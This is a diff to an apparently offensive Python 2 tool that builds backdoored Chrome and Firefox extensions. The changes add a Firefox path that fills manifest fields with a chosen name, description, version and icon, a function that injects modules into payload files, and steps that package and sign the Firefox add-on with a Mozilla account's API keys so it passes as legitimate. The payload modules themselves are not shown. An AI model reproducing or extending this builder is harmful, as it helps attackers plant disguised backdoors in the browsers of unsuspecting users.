@@ -4,6 +4,8 @@ import os,sys
 import shutil
 import errno
 import glob
+import subprocess
+import random
 
 class bcolors:
     HEADER = '\033[95m'
@@ -23,6 +25,89 @@ def copy(src, dest):
             shutil.copy(src, dest)
         else:
             print('Directory not copied. Error: %s' % e)
+
+
+def verify_xpi(output_name):
+	FNULL = open(os.devnull, 'w')
+	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking USER-KEY..."
+	config_file = open('config.ini').read()
+	user_id = config_file.split('MOZ_API_KEY=')[1].split('#')[0]
+	if user_id != '':
+		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking PRIV-KEY..."
+		priv_key = config_file.split('MOZ_PRIV_KEY=')[1].split('#')[0]
+		if priv_key != '':
+			xpi_file = glob.glob('output/'+output_name+'/*.xpi')
+			xpi_file =  xpi_file[0]
+			try:
+				action = 0
+				while action == 0:
+					user_input = raw_input('Directory for XPI load ('+os.getcwd()+') ? ')
+					if user_input == '':
+						user_input = os.getcwd()
+						action = 1
+					else:
+						if os.path.isdir(user_input):
+							action = 1
+				print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] please wait..."
+				subprocess.call(["jpm", "-v", "sign", "--api-key="+user_id, "--api-secret="+priv_key, "--xpi="+xpi_file],stdout=FNULL, stderr=subprocess.STDOUT)
+				print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] success sign xpi."
+				get_xpi_name = glob.glob('*.xpi')[0]
+				if user_input != os.getcwd():
+					shutil.move(get_xpi_name, user_input+"/"+get_xpi_name)
+			except:
+				 print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Error please install JPM."
+		else:
+			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Please configure account on config.ini"
+	else:
+		print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Please configure account on config.ini"
+
+def generate_xpi(output_name):
+	FNULL = open(os.devnull, 'w')
+	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking JPM..."
+	try:
+		subprocess.call(["jpm"],stdout=FNULL, stderr=subprocess.STDOUT)
+		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] generate XPI file..."
+		subprocess.call(["jpm", "xpi", '--addon-dir=output/'+output_name+''],stdout=FNULL, stderr=subprocess.STDOUT)
+		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] XPI OK." 
+		user_input = raw_input('\nSign XPI ? [Y/n] ')
+		if user_input == '' or user_input == 'y' or user_input == 'Y':
+			verify_xpi(output_name)
+	except OSError as e:
+		if e.errno == os.errno.ENOENT:
+			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Error on JPM."
+		else:
+			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] JPM not found."
+
+
+def insert_module():
+	action = 0
+	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Loading..."
+	print "---------------"
+	directory_list = glob.glob('includes/module/*.lframework')
+	for line in directory_list:
+		print "-> " + line.split('includes/module/')[1].split('.lframework')[0]
+	print "---------------"
+
+	while action == 0:
+		module_name =  raw_input('\nName of module ? ')
+		file_name = raw_input('Payload file : ')
+		if(os.path.isfile(file_name)):
+			if os.path.isfile('includes/module/'+module_name+'.lframework'):
+				load_module_content  = open('includes/module/'+module_name+'.lframework').read()
+				backup_check = open(file_name).read()
+				new_check = open('backup.check','w')
+				new_check.write(backup_check)
+				erase = open(file_name,'w').close()
+				write_check = open(file_name, 'a+')
+				for line in open('backup.check'):
+					if "//MODULE//" in line:
+						line = line.replace("//MODULE//", load_module_content)
+					write_check.write(line)
+				print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Module writed! '
+				action = 1
+				print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
+
+
 
 def load_module(backdoor_name):
 	action = 0
@@ -51,7 +136,6 @@ def load_module(backdoor_name):
 					load_check.write(line)
 				print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Module writed! '
 				action = 1
-				print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
 
 def making(information_array):
 	output_name = raw_input('Output Name : ')
@@ -63,7 +147,7 @@ def making(information_array):
 				copy('includes/exploit/icons/' + information_array['icon'], 'output/'+output_name+'/img/')
 			elif os.path.isfile(information_array['icon']):
 				copy(information_array['icon'], 'output/'+output_name+'/img/')
-			print "[%] Pattern copied"
+			print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Pattern copied'
 			# INSERT BACKDOOR_INFORMATION ASPECT
 			if(os.path.isfile('output/' + output_name + '/manifest.json')):
 				basic_manifest = open('includes/exploit/chrome/manifest.json')
@@ -78,6 +162,7 @@ def making(information_array):
 						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup description"
 					if "//VERSION//" in line:
 						line = line.replace("//VERSION//", information_array['version'])
+						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup version"
 					if "@@ICON@@" in line:
 						line = line.replace("@@ICON@@", information_array['icon'])
 					new_manifest.write(line)
@@ -85,12 +170,44 @@ def making(information_array):
 			user_input = raw_input('\nLoad Module ? [Y/n]: ')
 			if user_input == '' or user_input == 'Y' or user_input == 'y':
 				load_module(output_name)
-			else:
-				print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
-
+			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
 
 		elif information_array['type_backdoor'] == 'F':
 			print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Mozilla Firefox"
+			copy('includes/exploit/firefox', 'output/'+output_name)
+			if os.path.isfile('includes/exploit/icons/'+information_array['icon']):
+				copy('includes/exploit/icons/' + information_array['icon'], 'output/'+output_name+'/icon.png')
+			elif os.path.isfile(information_array['icon']):
+				copy(information_array['icon'], 'output/'+output_name+'/icon.png')
+			print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Pattern copied'
+			# INSERT BACKDOOR_INFORMATION ASPECT
+			if os.path.isfile('output/'+output_name+'/package.json'):
+				basic_manifest = open('includes/exploit/firefox/package.json')
+				erase = open('output/' + output_name + '/package.json', 'w').close()
+				new_manifest = open('output/' + output_name+ '/package.json', 'a+')
+				for line in basic_manifest:
+					if "//NAME_NB//" in line:
+						line = line.replace("//NAME_NB//", str(random.randint(1000,99999)))
+						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup uniqueId.."
+					if "//NAME//" in line:
+						line = line.replace("//NAME//", information_array['title'])
+						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup name.."
+					if "//DESCRIPTION//" in line:
+						line = line.replace("//DESCRIPTION//", information_array['description'])
+						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup description"
+					if "//VERSION//" in line:
+						line = line.replace("//VERSION//", information_array['version'])
+						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup version"
+					new_manifest.write(line)
+			# LOAD MODULE
+			new_manifest.close()
+			user_input = raw_input('\nLoad Module ? [Y/n]: ')
+			if user_input == '' or user_input == 'Y' or user_input == 'y':
+				load_module(output_name)
+			user_input = raw_input('\nGenerate XPI (need JPM) ? [Y/n]')
+			if user_input == 'Y' or user_input == '' or user_input == 'y':
+				generate_xpi(output_name)
+			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
 
 def backdooring(backdoor_type):
 	backdoor_information = {}
@@ -133,7 +250,7 @@ def generate_backdoor():
 
 	if user_input == 'g' or user_input == 'G':
 		backdooring('G')
-	elif user_input == 'f' or user_input == 'F':
+	elif user_input == 'm' or user_input == 'M':
 		backdooring('F')
 
 def gate_listing():
@@ -150,6 +267,8 @@ def menu():
 		generate_backdoor()
 	elif user_input == 's' or user_input == 'S':
 		gate_listing()
+	elif user_input == 'l' or user_input == 'L':
+		insert_module()
 
 
 
